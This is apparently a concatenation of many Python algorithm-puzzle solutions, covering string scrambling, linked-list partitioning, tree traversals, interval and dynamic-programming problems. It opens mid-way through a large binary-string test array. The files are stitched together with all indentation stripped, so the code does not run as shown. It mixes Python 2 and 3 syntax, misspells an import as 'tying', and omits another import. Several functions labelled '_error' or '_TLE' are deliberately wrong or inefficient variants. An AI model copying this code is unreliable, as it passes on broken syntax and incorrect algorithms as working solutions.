110110111011011111100001111111001111101110011111101101101011111001111001101111111111011011110110011111","01111111011101111111111011111101111011011111111111110111010011101111111101101010111111110111101110111111111011001111000110011111111110111111111110110011011011110001110101111100101001110011111111010110","01101001011011111110011101000101101011111101011100101111110111010110110100011111111110101101101111101110111110110101111111011101111111111101110110111111111111111111111111111101111101010111000111010011","10111101111111100011011111111111111011111011111111011111111111011111111111000111101110111010111111011111111101011101101101101111111111110100101111101110100111111111110110100111101111111111011001101101","11111010010011111111101001111000111110111110001111101101101101111010111111111111100010101011110111101011111111111111111111100011011111001111010111011101101111101111101110111111101111111111001111111110","11110111111111111101111001111011101110110111101111111110111111011111111000100011111101111001101110011110111111101001111111111111100011011110110001111101101111011010111111100101111111001111111110111101","11111111100011001111100111000111111011111111111110000011111100111010111010111111111111111111110111101111101111111100111110111111001111011010111111101011011100100111011110111110111110111111101111111110","01011111011111111101110111011111010111111111101111101111111011111110111100111010111111011111111111111011100101101101111001111011111011111111111011011111110100011111001111011111111100110111111111111111","01111000110111011110111111111111110110111100101111111011111110011011111111010111111011000010011111101110011010111111110111110011111111111110111111111111110011101111110111111101111111111111111111111111","10110111001111010111010011011111011111111101111110011111110011111011101111111111001101010001111111111111110111111001111101011111111011111101110111101111111100101011101111111101111111011111101101111101","11111110001111111110101111101111100011011111110111111111111111011011010101110101111011011111001111111101110110111111110111110101111111111001011111111011010110011110111111011111011110111111111110111111","01111110011110111011110111011111111111111101110111111110110111001110111011111111111111101111111011011111111101111110000111111111100111101111110011011001111110111011111001111000101001111111111111111111","11111111111110111011111111111110101011111110111110101001111111111011111111100011110011111110011110111111111101110111111110111101111111011111101111111101011111011110111110111111101111111110111111111101","11111011011010111111111111101111101001100001011100111011110111011111110100011110111111110111110111111110111110111110001100111110011111101111001111110100111101100111111010110101111001111001111100111111","11011111110101111111110100111111111111111011110111111111111110111010011111110111110000111011111101101111001111101100111111101111111101101010110111111111111011111001111110110101011100011111101101011010","01100101111111101100011001111011111111110111111001100100111011101111111001111001111101111010101111110101110111110101011111101111100110111111111111111011111101111111111111111111110110011101111111111111","10111111110111101110111111100111101011110111110111100111111111101100011101111111011011111111101011001111111111011111011101011111111111111110111111110111011111111011011111110110111111111111011011011100","11111111111111111111111001110111110101110101100011111111110111101011110100110111001111101111110111000000111110010011100111101010111101111111111111111011110111111101110111101111010111111111111111101111","10101110111101011111111110111110011111111010011101111111011110111111101101011111100111111101010111111101100011101111111011111111110110110111011111111111111111101111110111111111111101110111011111100011","10111110111111101111011111110101111101011110000101100111111101111011111110111111101111110101110011111000101101110011110100111011001111111011000001110011011110110110111011111111101011111111001111111010","10111110110101001101011111111011011111100100000101111111111110111111110000110111111011111110001111100101111110101110011110011111111101111101011111111111110011111101111111110111011111001011011111111111","01100110111001111111111011100100110100111111001111110111100110111100111111111100111111101110100110011110111101111111111110000011111111100110111111111110110101101111000001001111011111110111010111011101","11101011111011110010110110101010111010001111110111011110110111111111111001111111011100111101100011111111111101101111111111000001111111011111011111101110110110110111110111111101111100111111111111111111","11110100011110111101011111011110111001100110111111111111111110011111110011011101111111111010011011011001111101010111111111111111111011110011111111110111011011111111011111101110011011110011110111111110","11110111111111110110111111000011111101110101111100110011111111101111011011101111001010111010111111111111110011111111111111111101110101110111111001111100111111001011111011111100111011011101111111001111","01111011111111111011011101111111111111001111101001010111111111011101101010110011111110101010001111100101011111111101111011111010110110110111111111111110010110111111100111111000111011010010011111111101","01111111111011110110011110101111110001110111111111111001111111010111011001110111111111111011110011111101011001111110111110011111010101101111101111111110111000001011110111101111111111111111011111111111"])==48
class Solution:
def isScramble(self, s1, s2):
if len(s1)!=len(s2):
return False
chars = [0 for _ in xrange(26)]
for char in s1:
chars[ord(char)-ord('a')] += 1
for char in s2:
chars[ord(char)-ord('a')] -= 1
for val in chars:
if val!=0:
return False
if len(s1)==1:
return True
for i in xrange(1, len(s1)):
if self.isScramble(s1[:i], s2[:i]) and self.isScramble(s1[i:], s2[i:]) or \
self.isScramble(s1[:i], s2[-i:]) and self.isScramble(s1[i:], s2[:len(s2)-i]):
return True
return False
if __name__=="__main__":
assert Solution().isScramble("abc", "bca")==True
class ListNode:
def __init__(self, x):
self.val = x
self.next = None
def __repr__(self):
return repr(self.val)
class Solution:
def partition(self, head, x):
dummy = ListNode(0)
dummy.next = head
dummy_smaller = ListNode(0)
dummy_larger = ListNode(0)
pre = dummy
pre_smaller = dummy_smaller
pre_larger = dummy_larger
while pre.next:
cur = pre.next
if cur.val<x:
pre_smaller.next = cur
pre_smaller = pre_smaller.next
else:
pre_larger.next = cur
pre_larger = pre_larger.next
pre = pre.next
pre_larger.next = None
pre_smaller.next = dummy_larger.next
return dummy_smaller.next
if __name__=="__main__":
lst = [ListNode(2), ListNode(1)]
for ind in xrange(len(lst)-1):
lst[ind].next = lst[ind+1]
Solution().partition(lst[0], 2)
class Solution(object):
def merge(self, A, m, B, n):
i = m-1
j = n-1
closed = m+n
while i >= 0 and j >= 0:
closed -= 1
if A[i] > B[j]:
A[closed] = A[i]
i -= 1
else:
A[closed] = B[j]
j -= 1
if j >= 0: A[:closed] = B[:j+1]
class Solution:
def grayCode(self, n):
if n==0:
return [0]
result = [0, 1]
for num_of_bit in range(2, n+1):
msb = 1<<num_of_bit-1
for element in reversed(result):
result.append(msb+element)
return result
def grayCode_math(self, n):
return [(x>>1)^x for x in xrange(1<<n)]
class Solution:
def subsetsWithDup(self, S):
S.sort()
result = []
self.get_subset(S, [], result)
return result
def get_subset(self, S, current, result):
result.append(current)
for ind, val in enumerate(S):
if ind-1>=0 and val==S[ind-1]:
continue
self.get_subset(S[ind+1:], current+[val], result)
if __name__=="__main__":
print Solution().subsetsWithDup([1, 2, 3])
class Solution(object):
def numDecodings(self, s):
if s.startswith("0"):
return 0
n = len(s)
if not s:
return 0
F = [0 for _ in xrange(n+1)]
F[0] = 1
F[1] = 1
for i in xrange(2, n+1):
if s[i-1] != "0":
F[i] = F[i-1]
if 10 <= int(s[i-2]+s[i-1]) < 27:
F[i] += F[i-2]
else:
if s[i-2] in ("1", "2"):
F[i] = F[i-2]
else:
return 0
return F[-1]
if __name__ == "__main__":
assert Solution().numDecodings("10") == 1
assert Solution().numDecodings("27") == 1
assert Solution().numDecodings("12") == 2
assert Solution().numDecodings("0") == 0
class ListNode:
def __init__(self, x):
self.val = x
self.next = None
class Solution:
def reverseBetween(self, head: ListNode, m: int, n: int) -> ListNode:
prev = None
cur = head
l = 1
while l < m:
nxt = cur.next
prev = cur
cur = nxt
l += 1
leftend = prev
rightend = cur
while l <= n:
nxt = cur.next
cur.next = prev
prev = cur
cur = nxt
l += 1
if m != 1:
leftend.next = prev
else:
head = prev
rightend.next = cur
return head
class ListNode:
def __init__(self, x):
self.val = x
self.next = None
def __repr__(self):
return repr(self.val)
def __str__(self):
return str(self.val)+", "+str(self.next)
class Solution:
def reverseBetween(self, head, m, n):
if not head or m>=n:
return head
dummy = ListNode(0)
dummy.next = head
cnt = 1
pre = dummy
start_pre = None
start = None
cur = pre.next
while pre.next:
if cnt==m:
start_pre = pre
start = cur
elif m<cnt<=n:
cur.next, pre, cur = pre, cur, cur.next
cnt += 1
continue
elif cnt==n+1:
end = pre
start_pre.next = end
start.next = cur
break
pre = pre.next
cur = cur.next
cnt += 1
return dummy.next
if __name__=="__main__":
length = 3
lst = [ListNode(i+1) for i in range(length)]
for i in xrange(length-1):
lst[i].next = lst[i+1]
print Solution().reverseBetween(lst[0], 1, 3)
class Solution:
def restoreIpAddresses(self, s):
result = []
self.dfs(s, [], result)
return result
def dfs_complicated(self, seq, cur, result):
if len(cur) > 4:
return
if not cur or self.is_valid(cur[-1]):
if len(cur) == 4 and not seq:
result.append(".".join(cur))
return
for i in xrange(1, min(3, len(seq))+1):
self.dfs(seq[i:], cur+[seq[:i]], result)
def dfs(self, seq, cur, result):
if not seq and len(cur)==4:
result.append(".".join(cur))
return
for i in xrange(1, min(3, len(seq)) + 1):
new_seg = seq[:i]
if len(cur) < 4 and self.is_valid(new_seg):
self.dfs(seq[i:], cur + [new_seg], result)
else:
return
def is_valid(self, s):
if not s:
return False
return s == "0" or s[0]!="0" and 0<= int(s) <256
if __name__=="__main__":
IP = "25525511135"
print Solution().restoreIpAddresses(IP)
import math
class Solution(object):
def numTrees_math(self, n):
return math.factorial(2*n)/(math.factorial(n)*math.factorial(n))-math.factorial(2*n)/(
math.factorial(n+1)*math.factorial(n-1))
def numTrees(self, n):
if n < 2:
return n
dp = [0 for _ in xrange(n+1)]
dp[0] = 1
for i in xrange(1, n+1):
for j in xrange(i):
dp[i] += dp[j]*dp[i-j-1]
return dp[-1]
if __name__ == "__main__":
assert Solution().numTrees(100) == Solution().numTrees_math(100)
class TreeNode(object):
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution(object):
def inorderTraversal(self, root):
ret = []
cur = root
while cur:
if not cur.left:
ret.append(cur.val)
cur = cur.right
else:
pre = cur.left
while pre.right and pre.right != cur:
pre = pre.right
if not pre.right:
pre.right = cur
cur = cur.left
else:
pre.right = None
ret.append(cur.val)
cur = cur.right
return ret
def inorderTraversal_memory(self, root):
lst = []
self.inorderTraverse_itr(root, lst)
return lst
def inorderTraverse(self, root, lst):
if not root:
return
self.inorderTraverse(root.left, lst)
lst.append(root.val)
self.inorderTraverse(root.right, lst)
def inorderTraverse_itr(self, root, lst):
if not root:
return
cur = root
stk = []
while stk or cur:
while cur:
stk.append(cur)
cur = cur.left
cur = stk.pop()
lst.append(cur.val)
cur = cur.right
class TreeNode(object):
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution(object):
def __init__(self):
self.cache = {}
def generateTrees(self, n):
if n == 0:
return [None]
return self.generate_cache(1, n)
def generate_cache(self, start, end):
if (start, end) not in self.cache:
roots = []
if start > end:
roots.append(None)
return roots
for pivot in range(start, end+1):
left_roots = self.generate_cache(start, pivot-1)
right_roots = self.generate_cache(pivot+1, end)
for left_root in left_roots:
for right_root in right_roots:
root = TreeNode(pivot)
root.left = left_root
root.right = right_root
roots.append(root)
self.cache[(start, end)] = roots
return self.cache[(start, end)]
def generate(self, start, end):
subtree_roots = []
if start > end:
subtree_roots.append(None)
return subtree_roots
for pivot in range(start, end+1):
left_subtree_roots = self.generate(start, pivot-1)
right_subtree_roots = self.generate(pivot+1, end)
for left_node in left_subtree_roots:
for right_node in right_subtree_roots:
pivot_node = TreeNode(pivot)
pivot_node.left = left_node
pivot_node.right = right_node
subtree_roots.append(pivot_node)
return subtree_roots
class Solution(object):
def isInterleave(self, s1, s2, s3):
m = len(s1)
n = len(s2)
if m+n != len(s3):
return False
dp = [[False for _ in xrange(n+1)] for _ in xrange(m+1)]
dp[0][0] = True
for i in xrange(1, m+1):
dp[i][0] = dp[i-1][0] and s3[i+0-1] == s1[i-1]
for j in xrange(1, n+1):
dp[0][j] = dp[0][j-1] and s3[0+j-1] == s2[j-1]
for i in xrange(1, m+1):
for j in xrange(1, n+1):
if not dp[i][j]:
dp[i][j] = dp[i-1][j] and s3[i+j-1] == s1[i-1]
if not dp[i][j]:
dp[i][j] = dp[i][j-1] and s3[i+j-1] == s2[j-1]
return dp[-1][-1]
def isInterleave_TLE(self, s1, s2, s3):
if not s3:
return True
letter = s3[0]
if s1 and s1[0] == letter:
if self.isInterleave(s1[1:], s2, s3[1:]):
return True
if s2 and s2[0] == letter:
if self.isInterleave(s1, s2[1:], s3[1:]):
return True
return False
if __name__ == "__main__":
assert Solution().isInterleave("aa", "ab", "abaa") == True
assert Solution().isInterleave("aabcc", "dbbca", "aadbbcbcac") == True
assert Solution().isInterleave("aabcc", "dbbca", "aadbbbaccc") == False
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def isValidBST(self, root):
if not root:
return True
if not self.isValidBST(root.left):
return False
if not self.isValidBST(root.right):
return False
if root.left:
if not self.get_largest(root.left) < root.val:
return False
if root.right:
if not root.val < self.get_smallest(root.right):
return False
return True
def get_largest(self, root):
if not root.right:
return root.val
return self.get_largest(root.right)
def get_smallest(self, root):
if not root.left:
return root.val
return self.get_smallest(root.left)
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
def __repr__(self):
return repr(self.val)
class Solution:
def __init__(self):
self.swapped_pair = []
self.current = None
self.pre = None
def recoverTree(self, root):
self.in_order(root)
if len(self.swapped_pair)==2:
self.swapped_pair[0][0].val, self.swapped_pair[1][1].val = self.swapped_pair[1][1].val, self.swapped_pair[0][0].val
else:
self.swapped_pair[0][0].val, self.swapped_pair[0][1].val = self.swapped_pair[0][1].val, self.swapped_pair[0][0].val
return root
def in_order(self, current):
if not current:
return
self.in_order(current.left)
self.pre = self.current
self.current = current
if self.pre and not self.pre.val<self.current.val:
if not self.swapped_pair:
self.swapped_pair.append((self.pre, self.current))
else:
self.swapped_pair.append((self.pre, self.current))
self.in_order(current.right)
if __name__=="__main__":
node1 = TreeNode(2)
node2 = TreeNode(1)
node1.right = node2
print Solution().recoverTree(node1)
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def isSameTree(self, p, q):
if not p and not q:
return True
try:
if p.val==q.val and self.isSameTree(p.left, q.left) and self.isSameTree(p.right, q.right):
return True
except AttributeError:
return False
return False
from typing import List
from functools import lru_cache
class Solution:
def mergeStones(self, stones: List[int], K: int) -> int:
N = len(stones)
sums = [0]
for s in stones:
sums.append(sums[-1] + s)
@lru_cache(None)
def F(i, j, m):
if i >= j or m < 1:
return float("inf")
n = j - i
if (n - m) % (K - 1) != 0:
return float("inf")
if j == i + 1:
if m == 1:
return 0
return float("inf")
if m == 1:
return F(i, j, K) + sums[j] - sums[i]
ret = min(
F(i, mid, 1) + F(mid, j, m - 1)
for mid in range(i + 1, j, K - 1)
)
return ret
ret = F(0, N, 1)
return ret if ret != float("inf") else -1
if __name__ == "__main__":
assert Solution().mergeStones([3,5,1,2,6], 3) == 25
import string
from typing import List
from collections import Counter
class Solution:
def commonChars(self, A: List[str]) -> List[str]:
ret = []
if not A:
return ret
counter = Counter(A[0])
for a in A[1:]:
cur = Counter(a)
for c in string.ascii_lowercase:
counter[c] = min(counter[c], cur[c])
for c in string.ascii_lowercase:
if counter[c] > 0:
ret.extend([c] * counter[c])
return ret
from typing import List
class Solution:
def longestOnes(self, A: List[int], K: int) -> int:
i, j = 0, 0
cnt_0 = 0
n = len(A)
ret = 0
while i < n and j < n:
while j < n:
if A[j] == 0 and cnt_0 < K:
j += 1
cnt_0 += 1
elif A[j] == 1:
j += 1
else:
break
ret = max(ret, j - i)
if A[i] == 0:
cnt_0 -= 1
i += 1
return ret
if __name__ == "__main__":
assert Solution().longestOnes([1,1,1,0,0,0,1,1,1,1,0], 2) == 6
from typing import List
class Solution:
def largestSumAfterKNegations(self, A: List[int], K: int) -> int:
A.sort()
for i in range(len(A)):
if K == 0:
break
if A[i] < 0:
A[i] *= -1
prev = A[i]
K -= 1
else:
if K % 2 != 0:
if i - 1 >= 0 and A[i-1] < A[i]:
A[i-1] *= -1
else:
A[i] *= -1
break
return sum(A)
from typing import List
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def bstFromPreorder2(self, preorder: List[int]) -> TreeNode:
root = TreeNode(preorder[0])
stk = [root]
for a in preorder[1:]:
node = TreeNode(a)
if a < stk[-1].val:
stk[-1].left = node
else:
while len(stk) >= 2 and stk[-2].val < a:
stk.pop()
stk[-1].right = node
stk.pop()
stk.append(node)
return root
def bstFromPreorder(self, preorder: List[int]) -> TreeNode:
root = TreeNode(preorder[0])
stk = [root]
for a in preorder[1:]:
node = TreeNode(a)
if a < stk[-1].val:
stk[-1].left = node
else:
while stk and stk[-1].val < a:
pi = stk.pop()
pi.right = node
stk.append(node)
return root
class Solution:
def bitwiseComplement(self, N: int) -> int:
mask = 1
cur = N
while cur >> 1:
cur >>= 1
mask <<= 1
mask += 1
return ~N & mask
class TreeNode(object):
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution(object):
def isSymmetric(self, root):
if not root:
return True
return self.isSymmetrical(root.left, root.right)
def isSymmetrical(self, l, r):
if not l and not r:
return True
if (l and r and
l.val == r.val and self.isSymmetrical(l.left, r.right) and self.isSymmetrical(l.right, r.left)):
return True
return False
from typing import List
from collections import defaultdict
class Solution:
def numPairsDivisibleBy60(self, time: List[int]) -> int:
counter = defaultdict(int)
ret = 0
for t in time:
ret += counter[(60 - t) % 60]
counter[t % 60] += 1
return ret
def numPairsDivisibleBy60_error(self, time: List[int]) -> int:
hm = defaultdict(int)
for t in time:
hm[t % 60] += 1
ret = 0
for k, v in hm.items():
if k == 0:
ret += (v * (v - 1)) // 2
elif k <= 60 - k:
v2 =  hm[60 - k]
ret += v2 * v
return ret
from tying import List
class Solution:
def shipWithinDays(self, weights: List[int], D: int) -> int:
lo = max(weights)
hi = sum(weights)
while lo < hi:
mid = (lo + hi) // 2
cnt = 1
cur = 0
for w in weights:
cur += w
if cur > mid:
cnt += 1
cur = w
if cnt > D:
lo = mid + 1
else:
hi = mid
return lo
from typing import List
class Solution:
def canThreePartsEqualSum(self, A: List[int]) -> bool:
s = sum(A)
if s % 3 != 0:
return False
target = s // 3
count = 0
cur_sum = 0
for a in A:
cur_sum += a
if cur_sum == target:
count += 1
cur_sum = 0
return count == 3 and cur_sum == 0
if __name__ == "__main__":
assert Solution().canThreePartsEqualSum([3,3,6,5,-2,2,5,1,-9,4]) == True
from typing import List
class Solution:
def maxScoreSightseeingPair(self, A: List[int]) -> int:
ret = -float("inf")
prev_max = A[0]
for a in A[1:]:
ret = max(ret, prev_max - 1 + a)
prev_max = max(prev_max - 1, a)
return ret
def maxScoreSightseeingPair_error(self, A: List[int]) -> int:
n = len(A)
B = []
for i in range(n):
B.append(A[i] - i)
m1, m2 = None, None
for i in range(n):
if m1 is None:
m1 = i
elif m2 is None:
m2 = i
elif B[i] + (i - m1) > B[m1]:
m1 = i
elif B[i] + (i - m2) > B[m2]:
m2 = i
return A[m2] + A[m1] - abs(m2 - m1)
if __name__ == "__main__":
assert Solution().maxScoreSightseeingPair([8,1,5,2,6]) == 11
from collections import deque
class Solution:
def baseNeg2(self, N: int) -> str:
ret = deque()
while N != 0:
r = N % 2
ret.appendleft(r)
N -= r
N //= -2
return "".join(map(str, ret)) or "0"
if __name__ == "__main__":
assert Solution().baseNeg2(3) == "111"
assert Solution().baseNeg2(4) == "100"
from typing import List
class Solution:
def prefixesDivBy5(self, A: List[int]) -> List[bool]:
cur = 0
ret = []
for a in A:
cur = (cur << 1) + a
cur %= 5
if cur == 0:
ret.append(True)
else:
ret.append(False)
return ret
class ListNode:
def __init__(self, x):
self.val = x
self.next = None
from typing import List
class Solution:
def nextLargerNodes(self, head: ListNode) -> List[int]:
ret = []
stk = []
i = 0
cur = head
while cur:
while stk and stk[-1][1] < cur.val:
idx, _ = stk.pop()
ret[idx] = cur.val
stk.append([i, cur.val])
ret.append(0)
cur = cur.next
i += 1
return ret
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def levelOrder(self, root):
result = []
q = []
if root:
q.append(root)
while q:
length = len(q)
for i in range(length):
cur = q[i]
if cur.left:
q.append(cur.left)
if cur.right:
q.append(cur.right)
result.append(map(lambda x: x.val, q[:length]))
q = q[length:]
return result
if __name__=="__main__":
nodes = [TreeNode(i) for i in range(3)]
nodes[0].left = nodes[1]
nodes[1].left = nodes[2]
print Solution().levelOrder(nodes[0])
from typing import List
dirs = ((0, -1), (0, 1), (1, 0), (-1, 0))
class Solution:
def numEnclaves(self, A: List[List[int]]) -> int:
m, n = len(A), len(A[0])
visited = [[False for _ in range(n)] for _ in range(m)]
for i in range(m):
for j in range(n):
if not visited[i][j] and A[i][j] == 1 and (i == 0 or j == 0 or i == m - 1 or j == n - 1):
self.dfs(A, i, j, visited)
ret = 0
for i in range(m):
for j in range(n):
if A[i][j] == 1 and not visited[i][j]:
ret += 1
return ret
def dfs(self, A, i, j, visited):
m, n = len(A), len(A[0])
visited[i][j] = True
for di, dj in dirs:
I = i + di
J = j + dj
if 0 <= I < m and 0 <= J < n and not visited[I][J] and A[I][J] == 1:
self.dfs(A, I, J, visited)
class SolutionError:
def __init__(self):
self.ret = 0
def numEnclaves(self, A: List[List[int]]) -> int:
m, n = len(A), len(A[0])
visited = [[None for _ in range(n)] for _ in range(m)]
for i in range(m):
for j in range(n):
if not visited[i][j] and A[i][j] == 1:
self.dfs(A, i, j, visited)
return self.ret
def dfs(self, A, i, j, visited):
m, n = len(A), len(A[0])
visited[i][j] = 0
for di, dj in dirs:
I = i + di
J = j + dj
if not (0 <= I < m and 0 <= J < n):
visited[i][j] = 1
return True
if visited[I][J] == 1:
visited[i][j] = 1
return True
if visited[I][J] is None and A[I][J] == 1 and self.dfs(A, I, J, visited):
visited[i][j] = 1
return True
self.ret += 1
return False
from collections import deque
class Solution:
def removeOuterParentheses(self, S: str) -> str:
ret = []
cnt = 0
for e in S:
if e == "(":
cnt += 1
if cnt > 1:
ret.append(e)
else:
cnt -= 1
if cnt > 0:
ret.append(e)
return "".join(ret)
def removeOuterParentheses_error(self, S: str) -> str:
ret = []
stk = []
cur_q = deque()
for e in S:
if e == "(":
stk.append(e)
else:
prev = stk.pop()
if stk:
cur_q.appendleft(prev)
cur_q.append(e)
else:
ret.extend(cur_q)
cur_q = deque()
return "".join(ret)
if __name__ == "__main__":
assert Solution().removeOuterParentheses("(()())(())(()(()))") == "()()()()(())"
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def __init__(self):
self.ret = 0
self.lst = []
def sumRootToLeaf(self, root: TreeNode) -> int:
self.dfs(root)
return self.ret
def dfs(self, node):
if not node:
return
self.lst.append(node.val)
if not node.left and not node.right:
cur = 0
for a in self.lst:
cur <<= 1
cur += a
self.ret += cur
else:
self.dfs(node.left)
self.dfs(node.right)
self.lst.pop()
from typing import List
class Solution:
def camelMatch(self, queries: List[str], pattern: str) -> List[bool]:
ret = []
for q in queries:
ret.append(self.match(q, pattern))
return ret
def match(self, q, p):
i = 0
j = 0
while i < len(q) and j < len(p):
if q[i] == p[j]:
i += 1
j += 1
elif q[i].islower():
i += 1
else:
break
while i < len(q) and q[i].islower():
i += 1
return i == len(q) and j == len(p)
if __name__ == "__main__":
assert Solution().camelMatch(["FooBar","FooBarTest","FootBall","FrameBuffer","ForceFeedBack"], "FoBa") == [True, False, True, False, False]
from typing import List
class Solution:
def videoStitching(self, clips: List[List[int]], T: int) -> int:
clips.sort()
prev_e = 0
ret = 0
i = 0
while i < len(clips):
if clips[i][0] > prev_e:
break
max_e = -float("inf")
while i < len(clips) and clips[i][0] <= prev_e:
max_e = max(max_e, clips[i][1])
i += 1
prev_e = max_e
ret += 1
if prev_e >= T:
break
return ret if prev_e >= T else -1
def videoStitching_error(self, clips: List[List[int]], T: int) -> int:
A = [(s, -e, s, e) for s, e in clips]
A.sort()
ret = 1
_, _, prev_s, prev_e = A[0]
if prev_s > 0:
return False
for _, _, s, e in A[1:]:
if s <= prev_e and e > prev_e:
prev_e = e
ret += 1
if __name__ == "__main__":
assert Solution().videoStitching([[0,4],[2,8]], 5) == 2
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def __init__(self):
self.ret = 0
def maxAncestorDiff(self, root: TreeNode) -> int:
self.dfs(root)
return self.ret
def dfs(self, node):
if not node:
return float("inf"), -float("inf")
lmin, lmax = self.dfs(node.left)
rmin, rmax = self.dfs(node.right)
mini = min(lmin, rmin)
maxa = max(lmax, rmax)
if mini != float("inf"):
self.ret = max(self.ret, abs(mini - node.val))
if maxa != -float("inf"):
self.ret = max(self.ret, abs(maxa - node.val))
return min(mini, node.val), max(maxa, node.val)
from typing import List
from collections import defaultdict
class Solution:
def longestArithSeqLength(self, A: List[int]) -> int:
F = defaultdict(lambda: defaultdict(lambda: 1))
for i in range(len(A)):
for j in range(i):
delta = A[i] - A[j]
F[i][delta] = F[j][delta] + 1
ret = 0
for d in F.values():
for v in d.values():
ret = max(ret, v)
return ret
if __name__ == "__main__":
assert Solution().longestArithSeqLength([20,1,15,3,10,5,8]) == 4
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
from collections import OrderedDict
class Solution:
def recoverFromPreorder(self, S: str) -> TreeNode:
depth = 0
n = len(S)
i = 0
root = None
stk = []
while i < n:
if S[i] == "-":
depth += 1
i += 1
else:
j = i
while j < n and S[j] != "-":
j += 1
val = int(S[i:j])
cur = TreeNode(val)
if depth == 0:
root = cur
stk = [(depth, root)]
else:
assert stk
while stk[-1][0] != depth - 1:
stk.pop()
_, pi = stk[-1]
if not pi.left:
pi.left = cur
elif not pi.right:
pi.right = cur
stk.pop()
else:
raise
stk.append((depth, cur))
depth = 0
i = j
return root
def recoverFromPreorder_error(self, S: str) -> TreeNode:
depth = 0
depths = OrderedDict()
n = len(S)
i = 0
while i < n:
if S[i] == "-":
depth += 1
i += 1
else:
j = i
while j < n and S[j] != "-":
j += 1
val = int(S[i:j])
depths[val] = depth
depth = 0
i = j
stk = []
root = None
for k, v in depths.items():
cur = TreeNode(k)
if v == 0:
root = cur
stk = [root]
else:
assert stk
while depths[stk[-1].val] != v - 1:
stk.pop()
if not stk[-1].left:
stk[-1].left = cur
elif not stk[-1].right:
stk[-1].right = cur
stk.pop()
else:
raise
stk.append(cur)
return root
if __name__ == "__main__":
assert Solution().recoverFromPreorder("5-4--4")
assert Solution().recoverFromPreorder("1-2--3--4-5--6--7")
class Solution:
def twoCitySchedCost(self, costs: List[List[int]]) -> int:
A = [(a - b, a, b) for a, b in costs]
A.sort()
ret = 0
remain = len(A) // 2
for _, a, b in A:
if remain > 0:
ret += a
remain -= 1
else:
ret += b
return ret
def twoCitySchedCost_error(self, costs: List[List[int]]) -> int:
A = [(abs(a - b), a, b) for a, b in costs]
A.sort(reverse=True)
ret = 0
remain = len(A) // 2
for _, a, b in A:
if a > b:
ret += b
elif remain > 0:
ret += a
remain -= 1
else:
ret += b
return ret
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def zigzagLevelOrder(self, root):
if not root:
return []
result = []
lst = [root]
direction = False
while lst:
if direction:
result.append([element.val for element in lst])
else:
result.append([element.val for element in reversed(lst)])
for i in range(len(lst)):
element = lst.pop(0)
if element.left:
lst.append(element.left)
if element.right:
lst.append(element.right)
direction = not direction
return result
from typing import List
class Solution:
def allCellsDistOrder(self, R: int, C: int, r0: int, c0: int) -> List[List[int]]:
r_max = max(r0, R-1 - r0)
c_max = max(c0, C-1 - c0)
lst = [[] for _ in range(r_max + c_max + 1)]
for i in range(R):
for j in range(C):
lst[abs(i - r0) + abs(j - c0)].append([i, j])
ret = []
for e in lst:
ret.extend(e)
return ret
from typing import List
class Solution:
def maxSumTwoNoOverlap(self, A: List[int], L: int, M: int) -> int:
n = len(A)
F = [0 for _ in range(n + 1)]
for i, a in enumerate(A):
F[i+1] = F[i] + a
ret = -float("inf")
for l, m in ((L, M), (M, L)):
for i in range(n + 1 - l):
for j in range(i + l, n + 1 - m):
cur = F[i + l] - F[i] + F[j + m] - F[j]
ret = max(ret, cur)
return ret
if __name__ == "__main__":
assert Solution().maxSumTwoNoOverlap([0,6,5,2,2,5,1,9,4], 1, 2) == 20
class TreeNode(object):
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution(object):
def maxDepth(self, root):
return self.fathom(root, 0)
def fathom(self, root, depth):
if not root: return depth
else: return max(self.fathom(root.left, depth+1), self.fathom(root.right, depth+1))
dirs = [(-1, 0), (0, 1), (1, 0), (0, -1)]
class Solution:
def isRobotBounded(self, instructions: str) -> bool:
x, y = 0, 0
i = 0
for _ in range(4):
for cmd in instructions:
if cmd == "G":
dx, dy = dirs[i]
x += dx
y += dy
elif cmd == "L":
i = (i - 1) % 4
else:
i = (i + 1) % 4
return x == 0 and y == 0
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def buildTree(self, inorder, postorder):
if not inorder:
return None
root = TreeNode(postorder[-1])
root_index = inorder.index(root.val)
root.left = self.buildTree(inorder[:root_index], postorder[:root_index])
root.right = self.buildTree(inorder[root_index+1:], postorder[root_index:-1])
return root
from typing import List
import math
class Solution:
def minimizeError(self, prices: List[str], target: int) -> str:
A = list(map(float, prices))
f_sum = sum(map(math.floor, A))
c_sum = sum(map(math.ceil, A))
if not f_sum <= target <= c_sum:
return "-1"
errors = [
e - math.floor(e)
for e in A
]
errors.sort(reverse=True)
ret = 0
remain = target - f_sum
for err in errors:
if remain > 0:
ret += 1 - err
remain -= 1
else:
ret += err
return f'{ret:.{3}f}'
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def buildTree_MLE(self, preorder, inorder):
if not preorder:
return None
root = TreeNode(preorder[0])
root_index = inorder.index(root.val)
root.left = self.buildTree(preorder[1:root_index+1], inorder[0:root_index])
root.right = self.buildTree(preorder[root_index+1:], inorder[root_index+1:])
return root
def buildTree(self, preorder, inorder):
self.preorder = preorder
self.inorder = inorder
return self._buildTree(0, len(preorder), 0, len(inorder))
def _buildTree(self, pre_start, pre_end, in_start, in_end):
if pre_start >= pre_end:
return None
root = TreeNode(self.preorder[pre_start])
offset = self.inorder[in_start:in_end + 1].index(root.val)
root.left = self._buildTree(pre_start + 1, pre_start + offset + 1, in_start, in_start + offset)
root.right = self._buildTree(pre_start + offset + 1, pre_end, in_start + offset + 1, in_end)
return root
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def levelOrderBottom(self, root):
if not root:
return []
result = []
next_level = [root]
while next_level:
current_level = next_level
result.insert(0, map(lambda x: x.val, current_level))
next_level = []
for element in current_level:
